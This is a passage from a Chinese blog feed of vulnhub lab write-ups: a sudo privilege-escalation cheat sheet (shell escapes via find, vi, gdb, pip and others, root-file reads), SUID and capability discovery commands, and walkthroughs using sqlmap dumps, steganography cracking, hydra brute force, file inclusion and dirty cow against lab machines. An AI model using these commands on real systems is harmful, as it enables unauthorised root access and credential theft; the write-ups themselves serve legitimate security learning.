class="headerlink" title="base32"></a>base32</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br>sudo <span class="hljs-built_in">base32</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base32</span> --decode<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/hacksudoLPE/image-20231001193635774.png" alt="image-20231001193635774"></p><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br>sudo <span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cat</span> /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo comm <span class="hljs-regexp">/root/</span>root.txt <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 写</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DATA&quot;</span> | sudo <span class="hljs-built_in">cp</span> /dev/stdin /root/root.txt<br><span class="hljs-comment"># 读</span><br>sudo <span class="hljs-built_in">cp</span> /root/root.txt /dev/stdin<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cp</span> /bin/sh /bin/cp<br>sudo <span class="hljs-built_in">cp</span><br></code></pre></td></tr></table></figure><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo curl file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;&quot;</span> -f1 /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="dash"><a href="#dash" class="headerlink" title="dash"></a>dash</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo dash</span><br></code></pre></td></tr></table></figure><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">date</span> -f /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo diff --line-format=%L <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo ftp<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo gcc -<span class="hljs-keyword">wrapper</span> /bin/sh,-s .<br></code></pre></td></tr></table></figure><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo gdb -nx -<span class="hljs-keyword">ex</span> <span class="hljs-string">&#x27;!sh&#x27;</span> -<span class="hljs-keyword">ex</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sudo</span> <span class="hljs-built_in">ip</span> -force -batch /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>sudo pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo perl -e <span class="hljs-symbol">&#x27;exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>;&#x27;<br></code></pre></td></tr></table></figure><h3 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> view -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo wget -i <span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><h3 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> watch -x sh -c &#x27;reset; exec sh <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">0</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">sudo xxd /root/root.txt <span class="hljs-string">| xxd -r</span><br></code></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -u)<br>sudo zip <span class="hljs-variable">$TF</span> /etc/hosts -T -TT <span class="hljs-string">&#x27;sh #&#x27;</span><br>sudo <span class="hljs-built_in">rm</span> <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><h2 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h2><p>suid提权  共15关</p><p><img src="/2023/11/26/hacksudoLPE/image-20231002195530041.png" alt="image-20231002195530041"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">以下命令用来发现可提权的suid文件  <br><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br><span class="hljs-built_in">find</span> / -perm -4000 -type f -exec ls -al &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h2 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h2><p>特权 capabilities 滥用</p><p><img src="/2023/11/26/hacksudoLPE/image-20231003140320108.png" alt="image-20231003140320108"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">检查可执行文件获取的内核权限<br>getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h2 id="challenge-4"><a href="#challenge-4" class="headerlink" title="challenge 4"></a>challenge 4</h2><p>环境变量</p><p><img src="/2023/11/26/hacksudoLPE/image-20231003140638303.png" alt="image-20231003140638303"></p>]]></content>
    
    
    
    <tags>
      
      <tag>解题记录</tag>
      
      <tag>vulnhub</tag>
      
      <tag>学习</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub靶场日记</title>
    <link href="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/"/>
    <url>/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>先附一份网上找的难易顺序图，由于是从零开始，这里是先把容易的做完后尝试了几个latest</p><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E9%9A%BE%E6%98%93%E9%A1%BA%E5%BA%8F.png" alt="难易顺序"></p><p>这里只放出了几个writeup写的相对较完整的记录</p><h3 id="doubletrouble1"><a href="#doubletrouble1" class="headerlink" title="doubletrouble1"></a>doubletrouble1</h3><h4 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h4><ol><li>扫ip 发现端口</li><li>22 80</li><li>访问80网页，发现cms  qdpm 9.1</li><li>searchsploit qdpm 9.1 发现存在rce漏洞但需要登录</li><li>dirb目录发现 &#x2F;secret&#x2F;图片 和</li><li>隐写工具 steghide info 查看图片信息，需要密码  说明存在隐藏信息</li><li>爆破工具 stegseek 利用rockyou字典爆破出密码，解密出隐写txt</li><li>txt中存在用户账号密码</li><li>登录网页后返回第4步，利用rce漏洞拿到后门</li><li>后门为get方式请求，蚁剑失效，改用反弹shell</li><li>拿到shell后查看可执行sudo，发现可执行文件 &#x2F;usr&#x2F;bin&#x2F;awk</li><li>搜索awk提权，一句话拿到root</li><li>&#x2F;root 目录下存在新的ova文件，scp下载到kali，再导入到本机用vmware打开</li><li>上一步scp无法使用，改用pyhon    靶机处 python3 -m http.server 8888      kali wget <a href="http://ip:8888/%E6%96%87%E4%BB%B6">http://ip:8888/文件</a> 下载</li></ol><h4 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h4><ol><li><p>扫ip，发现端口22，80</p></li><li><p>扫目录，没什么发现</p></li><li><p>80端口存在登录框，用sqlmap爆破</p></li><li><p>发现用户名uname处存在时间盲注，爆破数据库<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164041503.png" alt="image-20230919164041503"></p></li><li><p>针对doubletrouble库爆破表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">&quot;uname=11&amp;psw=11&amp;btnLogin=Login&quot;</span> <span class="hljs-attr">--D</span> doubletrouble <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164241627.png" alt="image-20230919164241627"></p></li><li><p>爆破列</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users --columns --batch</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164620259.png" alt="image-20230919164620259"></p></li><li><p>爆数据</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users -C username --dump --batch</span><br><br><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users -C password --dump --batch</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164858731.png" alt="image-20230919164858731"><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919165010345.png" alt="image-20230919165010345"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------+</span><br><span class="hljs-section">| username |</span><br><span class="hljs-section">+----------+</span><br>| clapton  |<br><span class="hljs-section">| montreux |</span><br><span class="hljs-section">+----------+</span><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------+</span><br><span class="hljs-section">| password |</span><br><span class="hljs-section">+----------+</span><br>| GfsZxc1  |<br><span class="hljs-section">| ZubZub99 |</span><br><span class="hljs-section">+----------+</span><br></code></pre></td></tr></table></figure></li><li><p>web无法登录，尝试ssh</p></li><li><p>ssh <a href="mailto:&#99;&#x61;&#x6c;&#112;&#x74;&#111;&#x6e;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x34;&#x38;&#46;&#x31;&#x33;&#x38;">&#99;&#x61;&#x6c;&#112;&#x74;&#111;&#x6e;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x34;&#x38;&#46;&#x31;&#x33;&#x38;</a>  密码 ZubZub99 登陆成功</p></li><li><p>脏牛提权，拿flag</p></li></ol><h3 id="deathnote1"><a href="#deathnote1" class="headerlink" title="deathnote1"></a>deathnote1</h3><ol><li>扫ip，发现端口 22 80</li><li>扫目录，robots.txt 里面发现了他爹的提示在 &#x2F;important.jpg</li><li>访问&#x2F;important.jpg ，抓包得到他爹的提示  账号在user.txt(不用你说我也发现了)  密码在某个网页的源码里<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230920105133832.png" alt="image-20230920105133832"></li><li>还是wordpress，还是一眼的uploads文件夹，找到user.txt 和 notes.txt, 先保存在本地</li><li>尝试访问&#x2F;wordpress&#x2F;，一直加载中(汤姆生气.jpg)，[直接wget下载源码，replace所有的deathnote.vuln为192.168.48.140 本地访问][也可以修改host文件]，发现hint中存在疑似密码 iamjustic3 先保存</li><li>尝试hydra 进行ssh爆破，大小写都失败，换思路</li><li>用wpscan扫描，-U user.txt -P password –api-token [token] 扫出来了<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921111846366.png" alt="image-20230921111846366"></li><li>访问&#x2F;wordpress&#x2F;wp-admin， 用小写账号密码登录，成功进入wp管理页面</li><li>后台页面不让改，msf利用wp_admin_shell_upload 也不行   重新整合已有数据</li><li>notes.txt里像是一个字典，尝试hydra ssh爆破，密码用notes.txt, 跑出来一个<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921140036952.png" alt="image-20230921140036952"></li><li>ssh 连接进 l 用户，家目录有user.txt，鉴定为brainfuck，直接解码<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921140411876.png" alt="image-20230921140411876"></li><li>在opt&#x2F;L&#x2F;文件下有个提示，让看fake文件夹，cd进去，发现一个hint和一段wav文件</li><li>hint让用cyberchef，cat base.wav 得到一串数字<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921142129436.png" alt="image-20230921142129436"></li><li>cyberchef后得到密码 <img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921142226537.png" alt="image-20230921142226537" style="zoom: 80%;"></li><li>利用账号密码ssh到kira账户，拿到第一个flag<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921142411444.png" alt="image-20230921142411444"></li><li>sudo -l 发现all   直接sudo su到root权限，cat &#x2F;root&#x2F;root.txt<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921143305226.png" alt="image-20230921143305226"></li></ol><p>CONGRAT!!!!!!!</p><h3 id="evalbox1"><a href="#evalbox1" class="headerlink" title="evalbox1"></a>evalbox1</h3><h4 id="本题新知识"><a href="#本题新知识" class="headerlink" title="本题新知识"></a>本题新知识</h4><ul><li>扫文件时可以针对性的加后缀</li><li>参数爆破</li><li>文件包含漏洞：先尝试写入木马，失败后查看敏感信息</li><li>得到用户名后可以尝试用字典爆破用户家目录</li><li>ssh公私钥登录</li><li>可提权文件检测</li></ul><ol><li><p>扫ip，发现端口22，80</p></li><li><p>扫目录，发现了个robots.txt，暂时没啥用，还有个&#x2F;secret&#x2F; 不可直接查看内容<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921161510525.png" alt="image-20230921161510525" style="zoom: 25%;"></p></li><li><p>扫&#x2F;secret&#x2F;下文件，失败，添加.php后缀，扫到&#x2F;secret&#x2F;evil.php</p></li><li><p>直接访问php文件，空空如也，搜索得知此处当用 [参数爆破] 或 [文件包含检测]</p></li><li><p>burp开始爆破，字典用web-fuzzing-dir里的parameter 7w多个参数名</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/secret/evil.php?§aaa§=../index.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.48.141<br></code></pre></td></tr></table></figure></li><li><p>发现存在参数command，检查后确定为文件包含漏洞<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921161918549.png" alt="image-20230921161918549">   <img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921162039258.png" alt="image-20230921162039258"></p></li><li><p>利用php伪协议，拿到evil.php源码，只有一句include，无任何防护，直接开日</p></li><li><p>php:&#x2F;&#x2F;input 写入文件失败，查看敏感数据&#x2F;etc&#x2F;passwd上存在一个用户mowree，利用字典扫描该用户目录下存在的文件</p></li><li><p>接下来涉及到ssh公私钥爆破和公钥登录  拿shell后写入&#x2F;etc&#x2F;passwd提权</p></li></ol><h3 id="pwn-the-tron1"><a href="#pwn-the-tron1" class="headerlink" title="pwn the tron1"></a>pwn the tron1</h3><ol><li><p>扫ip，端口开放22 80 运行件版本没啥漏洞</p></li><li><p>查看网页，存在index.html 和 &#x2F;Travel&#x2F;index.html，里面有几张图片</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">A Tale <span class="hljs-keyword">of</span> Destructing<br>Cybertron was once <span class="hljs-keyword">a</span> home <span class="hljs-built_in">to</span> unique Autonomous Robotic Organism.<br>It has been thousands <span class="hljs-keyword">of</span> years since <span class="hljs-keyword">the</span> war between <span class="hljs-keyword">the</span> Autobots <span class="hljs-keyword">and</span> Deceptions started <span class="hljs-keyword">on</span> <span class="hljs-title">Cybertron</span>.<br>It destroyed <span class="hljs-keyword">the</span> planet <span class="hljs-keyword">and</span> made <span class="hljs-keyword">it</span> inhaspitable <span class="hljs-keyword">and</span> dead.<br><br>毁灭的故事<br>塞伯坦曾经是独特的自主机器人有机体的家园。<br>自从汽车人和欺骗者之间的战争在塞伯坦开始以来，已经过去了数千年。<br>它摧毁了这个星球，使它变得不可思议和死亡。<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">They arrived <span class="hljs-keyword">at</span> our Blue Planet, continuing their battle across <span class="hljs-keyword">the</span> universe.<br>Optimus Prime, leader <span class="hljs-keyword">of</span> Autobots took pledge <span class="hljs-built_in">to</span> protect <span class="hljs-keyword">the</span> humanity <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> evil wrath <span class="hljs-keyword">of</span> Megation.<br>Though lessen <span class="hljs-keyword">in</span> <span class="hljs-built_in">number</span>, Autobots are surely <span class="hljs-keyword">the</span> unsung warrions standing <span class="hljs-keyword">in</span> between <span class="hljs-keyword">the</span> destruction <span class="hljs-keyword">and</span> life.<br><br>他们抵达了我们的蓝色星球，继续他们在宇宙中的战斗。<br>汽车人领袖擎天柱发誓要保护人类免受Megation的邪恶愤怒。<br>虽然数量减少，但汽车人无疑是站在毁灭和生命之间的无名战士。<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Though Project Iacon, Megation <span class="hljs-built_in">found</span> <span class="hljs-keyword">out</span> about <span class="hljs-number">4</span> Omega Keys. <span class="hljs-keyword">If</span> these are used inside the Omega <span class="hljs-keyword">Lock</span> <span class="hljs-keyword">on</span> Cybertron, the Planet can be revived.<br>moreover, Omega <span class="hljs-keyword">Lock</span> can be used <span class="hljs-keyword">to</span> <span class="hljs-keyword">transform</span> Earth thus wiping <span class="hljs-keyword">out</span> the Humanity..!<br><br>通过Iacon计划，Megation发现了大约<span class="hljs-number">4</span>把欧米茄钥匙。如果将它们用于塞伯坦的欧米茄锁中，行星就可以复活。<br>此外，欧米茄锁可以用来改造地球，从而消灭人类..！<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">You are Jack. Assist <span class="hljs-keyword">the</span> Autobots <span class="hljs-keyword">in</span> stopping <span class="hljs-keyword">the</span> Megatron <span class="hljs-built_in">from</span> getting all <span class="hljs-keyword">the</span> <span class="hljs-number">4</span> <span class="hljs-built_in">keys</span>. Are you uo <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> mission?!<br>off <span class="hljs-keyword">the</span> Secret Autobot base!<br><br>你是杰克。协助汽车人阻止威震天获得所有 <span class="hljs-number">4</span> 把钥匙。你准备好执行任务了吗？！<br>离开秘密汽车人基地！<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vim">Optimus prime was able <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> encrypted coordinate of <span class="hljs-number">2</span> of <span class="hljs-built_in">keys</span> they appear <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> in same place.<br>You(Jack) are dispatched with bumblebee <span class="hljs-built_in">and</span> Arcee <span class="hljs-keyword">to</span> obtain the <span class="hljs-built_in">keys</span> <span class="hljs-keyword">do</span> it before Soundwave <span class="hljs-keyword">is</span> able <span class="hljs-keyword">to</span> decrypt them!<br><br>Can you <span class="hljs-keyword">find</span> @deception-base <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> the iacon_codes?<br>(Decepticons may <span class="hljs-keyword">delete</span> iacon codes out of security, <span class="hljs-keyword">find</span> <span class="hljs-keyword">a</span> way)<br><br>Encrypted message <span class="hljs-keyword">for</span> coordinates:<br>daab260727e470e56e77ec22e8f3d413<br><br>format <span class="hljs-keyword">for</span> decrypted message:<br><br>/iacon_code/(capital of <span class="hljs-keyword">a</span> countrey)/&#123;Latitude_dd.dd-Longitude_dd.dd&#125;.txt<br><br>d = any digit fron <span class="hljs-number">0</span>-<span class="hljs-number">9</span><br><br><br>擎天柱能够找到 <span class="hljs-number">2</span> 个密钥的加密坐标，它们似乎在同一个地方。<br>你（杰克）被派遣与大黄蜂和阿尔西一起在声波能够解密它们之前获得密钥！<br><br>你能找到@deception基地来获得iacon_codes吗？<br>（霸天虎可能会出于安全原因删除 iacon 代码，想办法）<br><br>坐标的加密消息：<br>DAAB260727E470E56E77EC22E8F3D413<br><br>解密消息的格式：<br><br>/iacon_code/（某国家首都）/&#123;Latitude_dd.dd-Longitude_dd.dd&#125;.txt<br><br>d = 任意数字 fron <span class="hljs-number">0</span>-<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure></li><li><p>综合这几篇信息，接下来有两种解法，要么找到所谓的deception基地，或者直接爆破，先爆出首都，再爆数字。</p></li><li><p>我们先尝试寻找deception基地，这里用到个新工具 <code>sharlock</code> 